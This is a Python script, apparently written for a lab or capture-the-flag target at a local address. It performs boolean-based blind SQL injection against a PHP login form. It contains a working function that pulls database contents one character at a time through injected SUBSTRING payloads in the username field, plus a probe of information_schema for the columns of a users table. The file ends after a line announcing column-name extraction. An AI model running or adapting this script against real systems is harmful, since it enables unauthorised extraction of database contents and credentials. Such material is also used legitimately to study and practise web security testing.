import requests
import time

TARGET_URL = "http://127.0.0.1:33038/index.php"

print("[*] Exploring database structure via Blind SQLi")

# Get table names
def extract_data(query_template, charset, max_len=30):
    """Extract data character by character using blind SQLi"""
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for char in charset:
            payload = f"admin' AND SUBSTRING(({query_template}),{pos},1)='{char}'-- -"
            data = {"username": payload, "password": "test", "submit": "submit"}
            response = requests.post(TARGET_URL, data=data)
            
            if '"password"' in response.text:
                result += char
                found = True
                print(f"[+] Position {pos}: '{char}' -> {result}")
                break
            time.sleep(0.02)
        
        if not found:
            print(f"[*] End of string at position {pos}")
            break
    return result

CHARSET_EXT = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

# Check what columns exist in users table
print("\n[*] Checking for additional columns in users table:")

column_checks = [
    ("' AND (SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users' LIMIT 0,1) IS NOT NULL-- -", "Column 0 exists"),
]

for payload, desc in column_checks:
    data = {"username": payload, "password": "test", "submit": "submit"}
    response = requests.post(TARGET_URL, data=data)
    print(f"[*] {desc}: {'TRUE' if chr(34)+'password'+chr(34) in response.text else 'FALSE'}")

# Look for all column names
print("\n[*] Extracting column names from users table:")
print("(Note: This may take a while...)")

